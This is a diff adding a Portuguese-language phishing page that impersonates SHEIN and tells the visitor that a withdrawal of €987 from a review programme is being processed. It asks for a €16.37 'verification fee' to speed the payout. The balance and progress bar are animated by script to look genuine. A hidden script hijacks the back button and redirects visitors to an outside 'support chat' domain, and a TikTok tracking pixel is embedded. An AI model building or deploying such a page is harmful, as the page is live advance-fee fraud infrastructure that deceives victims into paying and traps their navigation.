@@ -1,0 +1,83 @@
+<!DOCTYPE html><html lang="pt-PT"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SHEIN | Pedido de Levantamento</title>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap">
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: Inter, sans-serif; background: #f8f8f8; color: #111; }
+    .header { background: #fff; border-bottom: 1px solid #ececec; padding: 10px 16px; display: flex; justify-content: space-between; align-items: center; }
+    .brand { font-size: 24px; font-weight: 800; letter-spacing: 0.5px; }
+    .saldo-label { font-size: 12px; color: #666; text-align: right; }
+    .saldo-valor { font-size: 20px; font-weight: 700; color: #111; text-align: right; }
+    .container { max-width: 620px; margin: 0 auto; padding: 16px; }
+    .alert { background: #fff8e1; border: 1px solid #ffe082; color: #7a5b00; border-radius: 10px; padding: 14px; text-align: center; margin-bottom: 16px; }
+    .card { background: #fff; border-radius: 12px; padding: 18px; box-shadow: 0 2px 10px rgba(0,0,0,.04); }
+    .card p { color: #333; margin: 0 0 14px; line-height: 1.45; }
+    .cta { display: block; width: 100%; text-align: center; background: #111; color: #fff; text-decoration: none; border-radius: 10px; padding: 15px; font-weight: 700; }
+    .progress { height: 14px; background: #ececec; border-radius: 999px; overflow: hidden; margin: 14px 0; }
+    .bar { width: 0%; height: 100%; background: #111; color: #fff; font-size: 10px; display: flex; align-items: center; justify-content: center; transition: width .25s; }
+    .footer { text-align: center; color: #999; font-size: 12px; margin: 28px 0 8px; }
+  </style>
+<!-- TikTok Pixel -->
+<script type="text/javascript" async="" src="js/events.js"></script><script>
+!function (w, d, t) {
+  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script");n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
+  ttq.load('D7PL1V3C77U9KU0AHCHG');
+  ttq.page();
+}(window, document, 'ttq');
+</script>
+
+<script defer="" src="js/~flock.js" data-proxy-url="/~api/analytics"></script><meta property="og:image" content="images/id-preview-8c69cb26--329b57f3-ff2f-4b8f-a38b-0437c9cc6e73.lovable.app-1773459438715.png"><meta name="twitter:image" content="https://pub-bb2e103a32db4e198524a2e9ed8f35b4.r2.dev/f8c38583-5073-4d3c-bf8d-4222b770f7f6/id-preview-8c69cb26--329b57f3-ff2f-4b8f-a38b-0437c9cc6e73.lovable.app-1773459438715.png"></head>
+<body>
+  <header class="header">
+    <div class="brand">SHEIN</div>
+    <div>
+      <div class="saldo-label">Saldo Disponível</div>
+      <div class="saldo-valor">€ <span id="saldo">959,62</span></div>
+    </div>
+  </header>
+
+  <main class="container">
+    <div class="alert">O teu pedido de levantamento foi registado com sucesso. O valor será processado em até <strong>28 dias úteis</strong>.</div>
+
+    <section class="card">
+      <div class="progress"><div class="bar" id="bar" style="width: 26%;">26%</div></div>
+      <p>Estamos a processar o teu saque no valor de <strong>€987,00</strong> e as taxas reembolsáveis que serão somadas e enviadas.</p>
+      <p>Para conveniência dos utilizadores, oferecemos a opção de <strong>antecipar o levantamento</strong> mediante pagamento único da taxa de verificação.</p>
+      <p>Ao confirmar o pagamento na página seguinte, o processo de libertação é iniciado imediatamente.</p>
+      <a class="cta" href="checkout.html">Ir para pagamento da taxa (€16,37)</a>
+    </section>
+
+    <div class="footer">SHEIN © 2026 · Comunicação oficial do programa de avaliação</div>
+  </main>
+
+  <script>
+    const saldoEl = document.getElementById('saldo');
+    const bar = document.getElementById('bar');
+    let w = 0;
+    const target = 987;
+    let cur = 950;
+    const t = setInterval(() => {
+      w = Math.min(95, w + 1);
+      bar.style.width = w + '%';
+      bar.textContent = w + '%';
+      cur = Math.min(target, cur + 0.37);
+      saldoEl.textContent = cur.toFixed(2).replace('.', ',');
+      if (w >= 95) clearInterval(t);
+    }, 20);
+  </script>
+
+  <!-- Back Redirect -->
+  <script>
+    (function(){
+      var backUrl = 'https://chat.atendimentosuporte.online/b1';
+      history.pushState(null, '', location.href);
+      window.addEventListener('popstate', function(){
+        window.location.replace(backUrl);
+      });
+    })();
+  </script>
+
+
+</body></html>
